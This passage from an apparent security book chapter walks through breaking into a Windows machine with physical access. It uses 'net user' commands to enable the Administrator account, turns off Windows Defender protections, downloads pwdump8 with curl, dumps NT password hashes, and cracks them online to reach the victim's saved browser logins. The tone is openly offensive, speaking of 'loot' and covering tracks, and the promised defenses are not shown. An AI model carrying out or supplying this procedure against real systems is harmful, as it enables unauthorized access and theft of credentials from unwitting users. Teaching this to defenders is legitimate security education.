
![](img/181571ad74cba0e6a2f38fcd2658651e_22_0.png)

**FIGURE 1.12** Password files with some reset questions.

## COUNTERINTELLIGENCE/ADVANCED HACKING

Next, we will explore an even more nefarious approach to what was covered in the introduction section. I am not trying to repeat information in the first chapter of a book you paid for, but we need to take additional measures to seriously exploit the user. And, of course, we will add in the precautions you can take to prevent being the victim of this type of physical attack on your device later in the chapter. Basically, if you are using Windows 11 and a Microsoft account, you will be protected from this type of physical attack because BitLocker should be enabled. We will discuss the defense later in this chapter.

The physical exploit will start out basically the same but you will need to take some important additional steps to crack the default user’s password. And, if you want to cover your tracks to avoid being detected, you will need to do even more work (sigh). The loot, however, could be both rewarding and life changing. Because the machine is likely a trusted device, the device will likely not need Two-factor authentication for you to access critical websites or their email account. I personally know that this is the case for all my trusted devices. There are, however, some limitations to what can be done without having unfettered access to someone’s computer without access to their phone that might be required for two-factor authentication (2FA). We will examine those in this exploit as well.

After completing steps 1–10, “Breaking into the Windows Operating System”, and opening a command prompt by invoking the accessibility options button, you can take this different path to break into the system and recover valuable web logins by leveraging the typically disabled Administrator account. Then type the following commands to enable the administrator account, set a password for the account, and reboot the machine. The reboot is needed so the Administrator account shows up in the user list for Windows workstation. **Note:** On a Server which does not display usernames, the Administrator account will be active. Typically, because a server is used by multiple users, individuals will not store their personal account information in the browser. Using the second command below, you can still get into the Server operating system (you won’t need to reboot). Just type Administrator for the username and P@ssw0rd for the password.

- `C:\Windows\System32>net user Administrator /active:yes`
- `C:\Windows\System32>net user Administrator P@ssw0rd`
- `C:\Windows\System32>shutdown /r /t 30`

Log in as Administrator with P@ssw0rd or the password you set. You may go through a series of setup messages as this is the first time that this account has logged into the system.

![](img/181571ad74cba0e6a2f38fcd2658651e_23_0.png)

**FIGURE 1.13** Enabling the Administrator Account.

### DISABLING ANTI-VIRUS

The next thing we are going to do is disable the built-in Windows Defender Antivirus. We will need to do this so we can dump the password hashes. To disable antivirus in Windows, perform the following steps:

- Type Windows Security in the start search box and click open app (Figure 1.14).
- Next, we will tweak the Virus and Protection Settings. Click Virus and Protection Settings, and then click Manage Settings under Virus and Protection Settings (Figure 1.15).
- It is very likely that Real-time Protection, Cloud-delivered Protection, and Automatic sample submission will all be turned on. We will need to turn all three of them off, as seen in Figure 1.16.

![](img/181571ad74cba0e6a2f38fcd2658651e_23_1.png)

**FIGURE 1.14** Security App.

![](img/181571ad74cba0e6a2f38fcd2658651e_23_2.png)

**FIGURE 1.15** Virus and Protection Settings.

**Real-time protection**

Locates and stops malware from installing or running on your device. You can turn off this setting for a short time before it turns back on automatically.

Real-time protection is off, leaving your device vulnerable. Off

**Cloud-delivered protection**

Provides increased and faster protection with access to the latest protection data in the cloud. Works best with Automatic sample submission turned on.

Cloud-delivered protection is off. Your device may be vulnerable. Dismiss Off

**Automatic sample submission**

Send sample files to Microsoft to help protect you and others from potential threats. We'll prompt you if the file we need is likely to contain personal information.

Automatic sample submission is off. Your device may be vulnerable. Dismiss Off

**FIGURE 1.16** Real-time Protection, Cloud-delivered Protection, and Automatic Sample Submission.

Ok, now we will move on to downloading the latest version of pwdump. You can get the latest version (which is 8 at the time of this writing) from the following link: https://www.openwall.com/passwords/windows-pwdump. I don't really want to have to deal with the annoying security settings of Chrome or Edge complaining about viruses, so I will just go to the site, find the latest version of the software, and then I will right click and then select copy link address.

![](img/181571ad74cba0e6a2f38fcd2658651e_24_0.png)

**FIGURE 1.17** OpenWall for Pwdump download.

Next, we will want to open a command prompt. To do this, right click on start and go up to run and type cmd. Next, we can use curl to download the malicious file to our local system. We need to use the redirect (greater than sign) to output the file download with curl into a zip file.

```
C:\Users\Administrator>curl https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip > pwdump.zip
```

Notice that I was in the C:\Users\Administrator folder when I downloaded the file with the curl command, so that is where it will be located. Find the file in the C:\Users\Administrator folder, and then you will need to unzip the file by right clicking and selecting Extract all and clicking Extract.

![](img/181571ad74cba0e6a2f38fcd2658651e_25_0.png)

**FIGURE 1.18** Extracting Pwdump.

Next, we will navigate to the subfolder where pwdump has been extracted so we can dump the password hashes. In my case, I will switch to the pwdump directory, and then to the pwdump8 directory. In my case, since I am using version 8, I just type pwdump8 to dump the hashes. Remember, our goal was to get the password hash for the default user account so their browser logins and passwords will remain for Microsoft Edge and Google Chrome (I did not test Firefox, sorry).

- `C:\Users\Administrator>cd pwdump`
- `C:\Users\Administrator\pwdump>cd pwdump8`
- `C:\Users\Administrator\pwdump\pwdump8>pwdump8`

Note that 8 might need to be replaced based on the version of pwdump that you are using.

![](img/181571ad74cba0e6a2f38fcd2658651e_25_1.png)

**FIGURE 1.19** pwdump provides the needed password hash.

You should copy that NT hash to a text file on a USB drive (the USB drive you booted to would work well). We might need to use some tools and crack it and come back later. It depends on how secure a password the user used or if the hash has been cracked before. Next, if you want to move quickly, we can try to Google the hash. In my case, I get a hit and I know the user's actual password right away, as it appears in the search results. Shame on that user, me, for not using a more secure password.

**Note:** All of the beginning hashes are the same due to the LAN Manager hash not being utilized (by default) by operating systems since Windows Vista. Windows XP and 2003 Server were the last to utilize this hash by default, although earlier versions of Windows could be configured to use the NT hash.

![](img/181571ad74cba0e6a2f38fcd2658651e_26_0.png)

**FIGURE 1.20** The password hash in the Search Results.

Another option is to use a website which cracks password hashes. One of the more popular sites for doing this is crackstation.net. This site has annoying CAPTCHAs but it works well for the more secure Windows NTLM password hashes as well as the less-secure legacy LAN Manager password hashes.

![](img/181571ad74cba0e6a2f38fcd2658651e_26_1.png)

**FIGURE 1.21** Online password cracking.
